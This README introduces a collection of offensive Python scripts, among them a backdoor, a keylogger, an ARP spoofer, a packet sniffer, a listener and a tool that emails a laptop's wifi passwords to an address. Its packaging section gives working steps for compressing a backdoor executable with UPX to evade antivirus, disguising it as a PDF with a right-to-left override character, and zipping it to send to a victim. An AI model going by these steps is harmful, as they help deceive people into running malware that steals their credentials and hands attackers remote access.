# Python Scripts
A Collection of Python Scripts.

## Packaging

### Common
- Search pdf in [IconFinder](https://www.iconfinder.com/) to create an icon (Free, 512*\512, .ico)
- To bypass AntiVirus, use [UPX](https://github.com/upx/upx/releases) to compress exe file: ```./upx /root/PycharmProjects/backdoor/dist/backdoor.exe -o compressed_bacdoor.exe```
- Change the file extension:
  - Install Characters 3.34.0: ```apt install gnome-characters```
  - Search for 'Right-to-left Override' in 'Characters' tool in Kali
  - Select 'Copy Character' to copy 'Unicode U+202E' to clipboard
  - Open notepad and write 'al\*fdp.exe' then paste in the place of star
  - Rename the file to 'alexe.pdf'
- Zip the pdf file to hide the exe extension and send to victim

### Windows
- Install pyinstaller for python: ```python.exe -m pip install pyinstaller```
- Convert to exe: ```pyinstaller.exe backdoor.py --onefile --noconsole --add-data "/root/Downloads/sample.pdf;." --icon /root/Downlaods/pdf.ico```

### Linux
- Install python for Windows inside Linux: ```wine msiexec /i python-2.7.14.msi```
- Install pyinstaller for python: ```wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinstaller```
- Install all imported library: ```wine /root/.wine/drive_c/Python27/python.exe -m pip install pynput```
- Convert to exe: ```wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe backdoor.py --onefile --noconsole --add-data "/root/Downloads/sample.pdf;." --icon /root/Downlaods/pdf.ico```

## Usage

### Linux MAC Changer
```python linux_MAC_changer.py --interface eth0 --mac 12:11:11:11:11:11```
- First octet of the new MAC should be even (because of Unicast)

### Network Scanner
```python network_scanner.py --target 172.25.12.34/24```
- Use ```arp``` as a filter to check output in Wireshark

### ARP Spoofer
```python arp_spoofer.py --target 172.25.12.21 --gateway 172.25.12.1```
- Use ```echo 1 > /proc/sys/net/ipv4``` in attacker machine to route victim traffic to gateway

### Packet Sniffer
```python packet_sniffer.py --interface Ethernet```
- Use ```pip install scapy_http```
- Turn off all proxy
- Combine this script with Arp Spoofer

### ARP Spoof Detector
```python arp_spoof_detector.py```

### Wifi Passwords
```python packet_sniffer.py --interface Ethernet```
- Set "Less secure apps" for gmail account
- It will send all wifi credentials on laptop to an email address


### Key Logger
```python key_logger.py```
- Set "Less secure apps" for gmail account

### Listener
```python listener.py```
- Set attacker machine`a IP for my_listener object

### Backdoor
```python backdoor.py```
- Set attacker machine`a IP for my_backdoor object
- Use a sample pdf file to show to user

### Subdomain Discovery
```python subdomain_discovery.py```

### Directory Discovery
```python directory_discovery.py```

### Spider
```python spider.py```


